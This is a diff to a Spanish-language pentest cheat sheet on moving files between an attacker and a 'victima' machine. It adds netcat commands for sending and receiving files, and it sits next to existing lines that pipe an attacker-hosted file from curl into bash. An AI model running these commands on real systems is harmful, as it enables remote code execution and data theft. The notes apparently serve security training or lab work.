@@ -10,6 +10,9 @@ Levanta un servidor temporal en el directorio actual.
 python3 -m http.server <puerto>
 ```
 
+```bash
+nc <IP> <puerto> < <archivo>
+```
 ### Descarga desde Linux (victima)
 
 ```bash
@@ -20,6 +23,9 @@ curl http://<IP_atacante>:<puerto>/<archivo> | bash
 wget http://<IP_atacante>:<puerto>/<archivo>
 ```
 
+```bash
+nc -lvnp <puerto> > <archivo>
+```
 ### Descarga desde Windows (victima)
 
 Si no hay curl ni wget, se usa **CertUtil** (nativo de Windows):
